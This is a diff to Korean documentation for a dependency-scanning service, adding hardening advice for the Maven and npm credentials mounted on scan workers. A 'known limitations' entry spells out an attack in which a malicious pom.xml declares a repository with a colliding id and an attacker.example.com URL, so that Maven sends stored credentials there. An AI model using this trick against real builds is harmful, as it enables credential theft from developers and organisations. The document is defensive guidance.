@@ -37,6 +37,55 @@ sidebar_position: 7.5
 하기 위해서입니다. 프로젝트나 스캔 요청의 어떤 값도 이 경로에 무엇이 마운트되는지
 정하지 못하고, 오직 운영자의 배포 설정만 정합니다.
 
+## 파일 내용 예시
+
+### `settings.xml` (Maven)
+
+Maven은 특정 저장소 조회에 어떤 `<server>` 자격증명을 보낼지 저장소의 `<url>`이
+아니라 `<id>`로 판단합니다. 스캔 대상 프로젝트의 `pom.xml`은 원하는 `<id>`와
+`<url>`을 가진 `<repository>`를 얼마든지 선언할 수 있고, 그 `<id>`가 여러분의
+`settings.xml`에 있는 `<server>`의 `id`와 우연히 겹치면 Maven은 선언된 저장소와
+실제 저장소를 구분하지 못하고 그 자격증명을 그쪽으로 보냅니다. 이런 이유로
+`<server>`만 두는 방식에 기대면 안 됩니다. 대신 `<mirror mirrorOf="*">`로 모든
+조회를 신뢰하는 URL 하나에 고정하세요. 이렇게 하면 프로젝트가 선언한
+`<repository>`는 무시되고, `<id>`가 가로챌 대상 자체가 남지 않습니다.
+
+```xml
+<settings>
+  <mirrors>
+    <mirror>
+      <id>internal-mirror</id>
+      <mirrorOf>*</mirrorOf>
+      <url>https://nexus.internal.example.com/repository/maven-public/</url>
+    </mirror>
+  </mirrors>
+  <servers>
+    <server>
+      <id>internal-mirror</id>
+      <username>svc</username>
+      <password>S3cret</password>
+    </server>
+  </servers>
+</settings>
+```
+
+mirror 없이 `<server>`만 두면 어떤 문제가 생기는지는 아래 "알려진 한계"를
+참고하세요.
+
+### `.npmrc` (npm)
+
+자격증명은 `//호스트/경로/:_authToken=` 형태로 정확한 레지스트리 호스트에
+범위를 지정하세요. 범위를 지정하지 않은 `_auth`나 `_authToken` 줄은 이번
+설치에서 npm이 조회하는 모든 레지스트리에 적용됩니다. 스캔 대상 프로젝트의
+`package.json`이 `publishConfig.registry` 필드로 지정한 레지스트리도
+포함되므로, 워커에 마운트하는 자격증명에는 범위를 지정하지 않은 형태를 절대
+쓰지 마세요.
+
+```ini
+@myorg:registry=https://registry.internal.example.com/
+//registry.internal.example.com/:_authToken=${NPM_TOKEN}
+```
+
 ## 파일 넣기
 
 ### Docker Compose
@@ -152,6 +201,15 @@ pip가 각자 문서화한, 대체 설정 파일 경로를 가리키는 환경�
 
 ## 알려진 한계
 
+- **위 예시의 `<mirror mirrorOf="*">` 없이 `settings.xml`에 `<server>`만 두면
+  `<url>`이 아니라 `<id>`로 매칭됩니다.** Maven은 어떤 `<server>` 자격증명을
+  보낼지 저장소의 `<id>`만 보고 정합니다. 스캔 대상 프로젝트의 악성 `pom.xml`이
+  `<repository><id>internal-nexus</id><url>https://attacker.example.com/</url></repository>`를
+  선언할 수 있고, 여러분의 `settings.xml`에 `id`가 `internal-nexus`인
+  `<server>`가 있다면(흔히 고를 법한 이름이라 실제로 겹치기 쉽습니다) Maven은
+  그 자격증명을 실제 저장소가 아니라 공격자의 URL로 보냅니다.
+  `<mirror mirrorOf="*">` 형태는 프로젝트가 무엇을 선언하든 모든 조회를 URL
+  하나에 고정합니다. `<server>`만 두지 말고 이 형태를 쓰세요.
 - **프로젝트나 팀별이 아니라 워커 하나에 자격증명 하나입니다.** 조직별로 나뉘고
   pull 대상 이미지와 매칭하는 컨테이너 이미지 레지스트리 자격증명(ER3)과 달리,
   `/etc/trusca/registry` 아래 것은 그 스캔 파이프라인 워커가 실행하는 모든 소스
